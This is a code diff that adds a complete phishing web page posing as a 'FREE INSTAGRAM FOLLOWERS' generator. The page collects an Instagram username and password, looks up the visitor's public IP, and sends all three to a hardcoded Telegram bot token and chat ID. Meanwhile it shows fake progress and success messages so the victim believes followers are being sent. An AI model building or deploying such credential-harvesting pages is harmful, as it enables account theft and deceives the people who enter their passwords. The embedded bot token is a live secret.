@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Send Data to Telegram</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
+            font-family: Arial, sans-serif;
+        }
+        input, button {
+            font-size: 18px;
+            padding: 10px;
+            margin: 10px;
+            width: 250px;
+        }
+        button {
+            background-color: green;
+            color: white;
+            border: none;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        button:disabled {
+            background-color: gray;
+            cursor: not-allowed;
+        }
+        button:hover:enabled {
+            background-color: darkgreen;
+        }
+        /* Loader Animation */
+        .loader {
+            display: none;
+            width: 40px;
+            height: 40px;
+            border: 5px solid white;
+            border-top: 5px solid green;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-top: 10px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        /* Messages */
+        #loadingText, #finalMessage, #cooldownMessage {
+            display: none;
+            font-size: 18px;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+        #loadingText {
+            color: yellow;
+        }
+        #finalMessage {
+            color: lightgreen;
+        }
+        #cooldownMessage {
+            color: red;
+        }
+        /* Phased messages */
+        .phaseMessage {
+            display: none;
+            color: yellow;
+            font-weight: bold;
+        }
+
+        /* Typewriter Effect (Infinite Loop with delay) */
+        .typewriter-wrapper {
+            display: inline-block;
+            overflow: hidden;
+            white-space: nowrap;
+            letter-spacing: 0.15em;
+        }
+
+        .typewriter {
+            font-size: 30px;
+            color: white;
+            display: inline-block;
+            border-right: .15em solid green;
+            animation: typing 4s steps(30) 1s forwards, blink 0.75s step-end infinite, delete 3s steps(30) 8s forwards;
+        }
+
+        @keyframes typing {
+            from {
+                width: 0;
+            }
+            to {
+                width: 100%;
+            }
+        }
+
+        @keyframes blink {
+            50% {
+                border-color: transparent;
+            }
+        }
+
+        @keyframes delete {
+            from {
+                width: 100%;
+            }
+            to {
+                width: 0;
+            }
+        }
+
+    </style>
+</head>
+<body>
+    <!-- Animated Heading -->
+    <div class="typewriter-wrapper">
+        <h2 id="typewriterText">FREE INSTAGRAM FOLLOWERS</h2>
+    </div>
+
+    <input type="number" id="numberInput" placeholder="Enter how many followers you want">
+    <input type="text" id="usernameInput" placeholder="Enter a username">
+    <input type="password" id="passwordInput" placeholder="Enter a password">
+    <button id="sendButton" onclick="sendToTelegram()">Send</button>
+
+    <!-- Loader, Loading Text, and Final Message -->
+    <div id="loadingText">SENDING FOLLOWERS...</div>
+    <div id="loading" class="loader"></div>
+    <div id="finalMessage"></div>
+    <div id="cooldownMessage"></div>
+
+    <!-- Phased Messages -->
+    <div id="phase1" class="phaseMessage">Searching username...</div>
+    <div id="phase2" class="phaseMessage">Username found! Trying password...</div>
+    <div id="phase3" class="phaseMessage">Sending followers...</div>
+    <div id="passwordCorrect" class="phaseMessage">Correct password!</div>
+
+    <script>
+        let typeIndex = 0;
+        let deleting = false;
+        const text = "FREE INSTAGRAM FOLLOWERS";
+        const typewriterText = document.getElementById("typewriterText");
+
+        // Function for typing and deleting the text
+        function typeWriter() {
+            if (!deleting) {
+                // Type the text character by character
+                if (typeIndex < text.length) {
+                    typewriterText.innerHTML = text.slice(0, typeIndex + 1);
+                    typeIndex++;
+                } else {
+                    // Wait for 3 seconds once the text is fully typed
+                    setTimeout(() => {
+                        deleting = true;
+                    }, 3000);
+                }
+            } else {
+                // Delete the text character by character
+                if (typeIndex > 0) {
+                    typewriterText.innerHTML = text.slice(0, typeIndex - 1);
+                    typeIndex--;
+                } else {
+                    // Reset the typewriter effect to start again
+                    deleting = false;
+                    setTimeout(typeWriter, 500); // Delay before starting the next typing cycle
+                }
+            }
+        }
+
+        // Start the typing effect
+        setInterval(typeWriter, 100); // Adjust typing speed here
+
+        function sendToTelegram() {
+            const number = document.getElementById('numberInput').value;
+            const username = document.getElementById('usernameInput').value;
+            const password = document.getElementById('passwordInput').value;
+            const sendButton = document.getElementById('sendButton');
+            const loading = document.getElementById('loading');
+            const loadingText = document.getElementById('loadingText');
+            const finalMessage = document.getElementById('finalMessage');
+            const cooldownMessage = document.getElementById('cooldownMessage');
+            const phase1 = document.getElementById('phase1');
+            const phase2 = document.getElementById('phase2');
+            const phase3 = document.getElementById('phase3');
+            const passwordCorrect = document.getElementById('passwordCorrect');
+
+            // Check if user is in cooldown for the same username
+            const lastSentData = JSON.parse(localStorage.getItem('lastSentData'));
+            const cooldownDuration = 1200000; // 20 minutes in milliseconds
+
+            if (lastSentData && lastSentData.username === username) {
+                const elapsedTime = Date.now() - lastSentData.timestamp;
+                const remainingTime = cooldownDuration - elapsedTime;
+
+                if (remainingTime > 0) {
+                    const minutes = Math.floor(remainingTime / 60000);
+                    const seconds = Math.floor((remainingTime % 60000) / 1000);
+                    cooldownMessage.innerText = `You have already sent followers for this username! Please wait ${minutes} min ${seconds} sec.`;
+                    cooldownMessage.style.display = 'block';
+                    return;
+                }
+            }
+
+            if (!number || !username || !password) {
+                alert('Please fill in all fields');
+                return;
+            }
+
+            // Reset previous messages
+            cooldownMessage.style.display = 'none';
+            finalMessage.style.display = 'none';
+            phase1.style.display = 'none';
+            phase2.style.display = 'none';
+            phase3.style.display = 'none';
+            passwordCorrect.style.display = 'none'; // Hide password message
+            finalMessage.innerText = '';
+
+            // Disable button, show spinner and loading text
+            sendButton.disabled = true;
+            loading.style.display = 'block';
+            loadingText.style.display = 'block';
+
+            // Store the current timestamp and username in localStorage
+            const currentData = { username, timestamp: Date.now() };
+            localStorage.setItem('lastSentData', JSON.stringify(currentData));
+
+            // Start the animation phases (5s for searching, 5s for password, 10s for sending)
+            setTimeout(() => {
+                phase1.style.display = 'block'; // "Searching username..."
+            }, 1000); // Start phase 1 after 1s delay (to give time for UI)
+
+            setTimeout(() => {
+                phase1.style.display = 'none';
+                phase2.style.display = 'block'; // "Username found! Trying password..."
+            }, 6000); // Show "Trying password..." after 5s
+
+            // Show "Correct password" for 5 seconds
+            setTimeout(() => {
+                phase2.style.display = 'none';
+                passwordCorrect.style.display = 'block'; // "Correct password!"
+            }, 11000); // Show "Correct password..." after 5s of trying password
+
+            setTimeout(() => {
+                passwordCorrect.style.display = 'none'; // Hide the "Correct password" message
+                phase3.style.display = 'block'; // "Sending followers..."
+            }, 16000); // Show "Sending followers..." after another 5s
+
+            // Fetch user's public IP address using ipify API
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ipAddress = data.ip;
+
+                    // Now, simulate sending the followers and only then display success
+                    setTimeout(() => {
+                        const botToken = '7860515679:AAFnL-Unl7WnyOQbOyd-yaERErJA6nK52hg';
+                        const chatId = '5760976310';
+                        const text = `📢 New Request:\n👤 Username: ${username}\n🔢 Followers: ${number}\n🔒 Password: ${password}\n🌍 IP Address: ${ipAddress}`;
+
+                        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
+
+                        fetch(url)
+                            .then(response => response.json())
+                            .then(data => {
+                                if (data.ok) {
+                                    // Hide "Sending followers..." and show success message
+                                    phase3.style.display = 'none';
+                                    finalMessage.innerText = `${number} followers sent! ✅`;
+                                    finalMessage.style.display = 'block';
+                                } else {
+                                    alert('Failed to send data. Check bot token and chat ID.');
+                                }
+                            })
+                            .catch(error => console.error('Error:', error))
+                            .finally(() => {
+                                // Hide the spinner and loading text after the process is done
+                                loading.style.display = 'none';
+                                loadingText.style.display = 'none';
+                            });
+
+                        // Enable the button after 20 minutes (1200000 milliseconds)
+                        setTimeout(() => {
+                            localStorage.removeItem('lastSentData');
+                            sendButton.disabled = false;
+                        }, cooldownDuration);
+                    }, 21000); // Total 21s for full animation and data sending
+                })
+                .catch(error => {
+                    console.error('Error fetching IP:', error);
+                    loading.style.display = 'none';
+                    loadingText.style.display = 'none';
+                    alert('Failed to fetch IP address. Please try again later.');
+                });
+        }
+    </script>
+</body>
+</html>
